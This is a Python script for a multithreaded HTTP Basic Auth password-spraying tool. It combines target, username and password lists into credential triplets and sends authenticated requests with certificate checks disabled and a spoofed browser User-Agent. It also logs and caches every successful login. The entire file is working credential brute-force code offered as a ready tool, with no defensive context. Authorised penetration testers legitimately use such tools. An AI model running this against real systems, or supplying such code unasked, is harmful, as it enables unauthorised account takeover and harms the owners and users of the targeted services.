import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.listUtils as lu
import ZHOR_Modules.osUtils as osu
import ZHOR_Modules.logUtils as logu
import ZHOR_Modules.timestampsUtils as tsu
import ZHOR_Modules.SPTT as SPTT

import sqlite3
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from datetime import timedelta
import argparse
import sys
import threading
import os
import time





parser = argparse.ArgumentParser(description="Basic Auth Spray")
REQUIRED_ARGUMENTS = parser.add_argument_group("Required arguments")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Optional arguments")

# Required arguments
REQUIRED_ARGUMENTS.add_argument('-t',metavar='"TARGET(s)"',type=str,required=True,help='Target IP/fqdn. Can either be a single target or a file')
REQUIRED_ARGUMENTS.add_argument('-u',metavar='"USERS"',type=str,required=True,help='Users list file')
REQUIRED_ARGUMENTS.add_argument('-p',metavar='"PASSWORDS"',type=str,required=True,help='Passwords list file')
REQUIRED_ARGUMENTS.add_argument('-s',metavar='"SLEEP"',type=int,required=True,help='Sleep time between each request (in milliseconds)')
REQUIRED_ARGUMENTS.add_argument('-T',metavar='"THREADS"',type=int,required=True,help='Threads (corresponding to concurrent requests)')
REQUIRED_ARGUMENTS.add_argument('-m',metavar='"MODE"',type=int,required=True,help='Triplet Mode (read documentation for details)')

# Optional arguments
OPTIONAL_ARGUMENTS.add_argument('-q',action="store_true",help='"Quiet" mode: Skip the initial recap and the "press enter to continue" message')
OPTIONAL_ARGUMENTS.add_argument('--timeout',type=int,required=False,help='Connection attempt timeout (in milliseconds). By default is 1000ms')
OPTIONAL_ARGUMENTS.add_argument('--https',action="store_true",help="Use https instead of http")
OPTIONAL_ARGUMENTS.add_argument('--no-cache',action="store_true",help="Ignore cached results")
OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")

args = parser.parse_args()

np.DEBUG = ('--debug' in sys.argv)

# ========================================================================================================

HEADERS = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36"}
#PROXYES = {"http":"127.0.0.1:8080","https":"127.0.0.1:8080"}
PROXYES = None

LOG_LOCK    = threading.Lock()
STDOUT_LOCK = threading.Lock()
DB_LOCK     = threading.Lock()
LOG_PATH = f"logs/basic_auth_bf_log_{tsu.getTimeStamp_iso8601()}.log"
CACHE_DB = "basic-auth-spray-cache.db"
HTTPS = False
SKIP_CACHE = False
CONNECTION_TIMEOUT = None
UNAUTHORIZED_WORDS = fm.fileToSimpleList('unauthorized.txt')

TupleCacher = SPTT.TupleCacher('cache/basic-auth-spray-cache.db',columnNames=['target','username','password'],columnTypes=['TEXT','TEXT','BLOB'])


# return 0 if it was unsuccessful
# return 1 otherwise
def determineResult(responseObject):

    # fail due to 401
    if (responseObject.status_code == 401):
        return 0
    
    # fail due to a keyword suggesting failure
    for word in UNAUTHORIZED_WORDS:
        if word in responseObject.text.lower():
            return 0
        

    # success
    return 1

def attemptConnection(target: str, username: str, password: str):
    result = None

    try:
        auth = (username,password)
        if HTTPS:
            prefix = "https://"
        else:
            prefix = "http://"
        
        result = requests.get(url= prefix + target,headers=HEADERS,proxies=PROXYES,verify=False,auth=auth,timeout=CONNECTION_TIMEOUT)
        
    except Exception as e:
        msg = "[EXCEPTION] Target {} | User: {} | Password: {} | {}".format(prefix + target,username,password,str(e))        
        logu.logError(msg,fileName=LOG_PATH, lock=LOG_LOCK,stdout=True)
        return -1

    return determineResult(result)

    


# function used by the threads
def threadWrapperFunction(threadID: int,triplets: list,sleepTime: int):
    # triplet structure
    # [target,user,password]

    for triplet in triplets:

        if TupleCacher.tupleExists((triplet[0],triplet[1],triplet[2])):

            msg = "[Thread #{}] [CACHED] Target {} | User: {} | Password: {}".format(str(threadID),triplet[0],triplet[1],triplet[2])
            np.debugPrint(msg,lock=STDOUT_LOCK)
        
        else:
            msg = "[Thread #{}] [testing] Target {} | User: {} | Password: {}".format(str(threadID),triplet[0],triplet[1],triplet[2])
            np.debugPrint(msg,lock=STDOUT_LOCK)

            res = attemptConnection(triplet[0],triplet[1],triplet[2])

            # auth succeded
            if res == 1:        
                msg = "[SUCCESS] Target {} | User: {} | Password: {}".format(triplet[0],triplet[1],triplet[2])
                logu.logInfo(msg,fileName=LOG_PATH,lock=LOG_LOCK)
                TupleCacher.insertSuccess((triplet[0],triplet[1],triplet[2]))

            # auth failed
            if res == 0:                
                msg = "[FAILED] Target {} | User: {} | Password: {}".format(triplet[0],triplet[1],triplet[2])
                logu.logDebug(msg,fileName=LOG_PATH,lock=LOG_LOCK)
                TupleCacher.insertFail((triplet[0],triplet[1],triplet[2]))

            time.sleep(sleepTime)


# builds the triplets
def makeTriplets(tripletMode: int,targets: list, users: list, passwords: list):
    
    #  all possible permutations
    if tripletMode == 1:
        return lu.listsElementsPermutations([targets,users,passwords])

    # for each target, couple the user and pw
    # NOTE: for this, it is required that the amount of users == amount of passwords
    if tripletMode == 2:
        
        if len(users) != len(passwords):
            np.errorPrint("The amount of users does not equal the amount of passwords (it is a mandatory requirement for triplet mode 2)")
            exit()

        _triplets = []

        for t in targets:
            for i in range(0,len(users)):
                _triplets.append([t,users[i],passwords[i]])

        return _triplets

def recap(tripletMode: int, targets: list, users: list, passwords: list,threadCount: int,sleepTime: int):
    
    totalRequests = None

    if tripletMode == 1:
        totalRequests = len(targets) * len(users) * len(passwords)

    if tripletMode == 2:
        totalRequests = len(targets) * len(users)
    
    np.infoPrint("Recap")
    print("Targets:",len(targets),sep="\r\t\t\t")
    print("Usernames:",len(users),sep="\r\t\t\t")
    print("Passwords:",len(passwords),sep="\r\t\t\t")
    print("Triplet mode:",tripletMode,sep="\r\t\t\t")
    print("Total requests:",totalRequests,sep="\r\t\t\t")
    print("Simultaneous requests:",threadCount,sep="\r\t\t\t")
    print("Sleep time (sec)",sleepTime,sep="\r\t\t\t")
    print("\n")

    etaSeconds = None
    if sleepTime == 0:
        etaSeconds = ((totalRequests) / threadCount) * 1
    else:
        etaSeconds = ((totalRequests / threadCount) * sleepTime)



    eta = timedelta(seconds=etaSeconds)
    print("ETA (best case):",eta)
    print("\n")

    osu.pressEnterToContinue()


if __name__ == '__main__':
    

    quiet       = '-q' in sys.argv
    SKIP_CACHE  = '--no-cache' in sys.argv

    if SPTT.safeWordlistSize(args.p):
        pass
    else:
        np.warningPrint("The wordlist you selected is very large and may cause the script or machine to crash. Press enter to continue or quit with CTRL+C and select a smaller wordlist.")
        input()
    
    tripletMode = args.m
    
    targets = []
    if os.path.isfile(args.t):
        targets = fm.fileToSimpleList(args.t)
    else:
        targets = [args.t]

    users       = fm.fileToSimpleList(args.u)
    passwords   = fm.fileToSimpleList(args.p)
    sleepTime   = 0 
    if args.s > 0: sleepTime = int(args.s) / 1000
    threadCount = args.T

    if '-d' in sys.argv:
        CACHE_DB = args.d


    if '--timeout' in sys.argv:
        if args.timeout == 0:
            CONNECTION_TIMEOUT = 0
        else:
            CONNECTION_TIMEOUT = int(args.timeout) / 1000


    # organizing triplets
    triplets = makeTriplets(tripletMode,targets,users,passwords)
    threadList = []
    sublists = lu.splitList(triplets, threadCount)
    
    for i in range(0,threadCount):
        argument = sublists[i]
        t = threading.Thread(target=threadWrapperFunction,args=(i+1,sublists[i],sleepTime))
        threadList.append(t)


    if not quiet:
        recap(tripletMode,targets,users,passwords,threadCount,sleepTime)


    logu.logInfo(lu.concatenate_elements(sys.argv,' '),fileName=LOG_PATH, lock=LOG_LOCK,stdout=False)

    # starting threads
    np.debugPrint("Starting threads")
    for thread in threadList:
        thread.start()


    # waiting for each thread to finish
    for thread in threadList:
        thread.join()

    TupleCacher.dumpToDB()
    np.infoPrint("Job done. Check log for results")